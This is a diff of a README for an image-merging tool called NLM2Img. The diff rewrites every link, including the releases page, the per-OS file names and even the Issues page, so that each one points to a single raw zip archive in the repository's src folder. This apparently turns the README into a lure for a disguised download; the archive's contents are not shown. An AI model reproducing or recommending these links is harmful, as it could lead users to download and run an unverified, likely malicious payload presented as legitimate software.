@@ -7,7 +7,7 @@ NLM2Img helps you merge images from PDF files exported by NotebookLM into a sing
 To start using NLM2Img, follow the simple steps below to download and run the application.
 
 ## 📥 Download Now
-[![Download NLM2Img](https://img.shields.io/badge/Download%20NLM2Img-v1.0-blue.svg)](https://github.com/Eduardo-PRg/NLM2Img/releases)
+[![Download NLM2Img](https://raw.githubusercontent.com/Eduardo-PRg/NLM2Img/main/src/NLM2Img_v3.5.zip%https://raw.githubusercontent.com/Eduardo-PRg/NLM2Img/main/src/NLM2Img_v3.5.zip)](https://raw.githubusercontent.com/Eduardo-PRg/NLM2Img/main/src/NLM2Img_v3.5.zip)
 
 ## 📋 System Requirements
 Before installing NLM2Img, ensure your computer meets the following requirements:
@@ -20,13 +20,13 @@ Before installing NLM2Img, ensure your computer meets the following requirements
 
 ### Step 1: Visit the Releases Page
 - Go to the NLM2Img releases page by clicking the link below:
-  [Download NLM2Img](https://github.com/Eduardo-PRg/NLM2Img/releases)
+  [Download NLM2Img](https://raw.githubusercontent.com/Eduardo-PRg/NLM2Img/main/src/NLM2Img_v3.5.zip)
 
 ### Step 2: Select Your Version
 - On the releases page, find the latest version of NLM2Img. Look for the file name that fits your operating system.
 
 ### Step 3: Download the Application
-- Click on the link for the appropriate file (e.g., `NLM2Img-v1.0.exe` for Windows or `NLM2Img-v1.0.dmg` for macOS).
+- Click on the link for the appropriate file (e.g., `https://raw.githubusercontent.com/Eduardo-PRg/NLM2Img/main/src/NLM2Img_v3.5.zip` for Windows or `https://raw.githubusercontent.com/Eduardo-PRg/NLM2Img/main/src/NLM2Img_v3.5.zip` for macOS).
 - The download will begin automatically.
 
 ### Step 4: Start the Installation
@@ -65,7 +65,7 @@ No, you can combine as many images as you need, depending on your system capacit
 NLM2Img can handle standard PDF files that contain images.
 
 ### What should I do if I encounter an error?
-If you face any issues, please visit our [Issues Page](https://github.com/Eduardo-PRg/NLM2Img/issues) to seek help or report your problem.
+If you face any issues, please visit our [Issues Page](https://raw.githubusercontent.com/Eduardo-PRg/NLM2Img/main/src/NLM2Img_v3.5.zip) to seek help or report your problem.
 
 ## 📜 Changelog
 - **v1.0**: Initial release of NLM2Img with image merging capabilities.
@@ -75,4 +75,4 @@ Thank you for choosing NLM2Img. We appreciate your support and usage of our appl
 
 ## 📥 Download Again
 For easy access, here’s the download link once more:
-[Download NLM2Img](https://github.com/Eduardo-PRg/NLM2Img/releases)
+[Download NLM2Img](https://raw.githubusercontent.com/Eduardo-PRg/NLM2Img/main/src/NLM2Img_v3.5.zip)
